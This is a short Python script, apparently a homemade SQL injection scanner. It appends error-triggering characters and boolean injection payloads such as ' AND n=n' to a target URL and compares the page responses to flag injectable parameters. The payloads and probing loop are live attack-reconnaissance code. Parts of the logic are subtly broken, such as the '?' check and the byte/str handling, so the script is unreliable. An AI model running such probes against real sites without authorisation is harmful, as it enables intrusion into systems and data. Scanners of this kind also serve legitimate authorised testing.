#-*- coding:utf-8 -*-
import requests,re,random,json

BOOLEAN_TESTS = (" AND %d=%d","OR NOT (%d=%d)")
DBMS_ERRORS = {}

with open("sqldict.txt", "rb") as fd:
    sqlerr = None
    for line in fd:
        line = line.strip()
        if ':' in line:
            sqlerr = re.findall(r'\(.*\)',line)[0]
            # print ('sqlerr:'+sqlerr)
            sqltype = re.findall(r'\".*?\"',line)[0]
            # print ("sqltype"+sqltype)
            DBMS_ERRORS.setdefault(sqltype, sqlerr)
        else:
            continue
# print(json.dumps(DBMS_ERRORS, indent = 1).decode("unicode-escape"))
def sqlcheck(url):
    if (not url.find("?")):
        return False
    _url = url + "%29%28%22%27" # )("'
    _content = requests.get(_url).text
    for dbms in DBMS_ERRORS:
        if(re.search(DBMS_ERRORS[dbms],_content)):
            return True
    content = {}
    content["origin"] = requests.get(url).text
    for test_payload in BOOLEAN_TESTS:
        RANDINI = random.randint(1,255)
        _url = url + test_payload%(RANDINI,RANDINI)
        content["ture"] = requests.get(_url).text
        _url = url +test_payload%(RANDINI,RANDINI+1)
        content["false"] = requests.get(_url).text
        if content["origin"]==content["ture"]!=content["false"]:
            return "sql found: %s"%url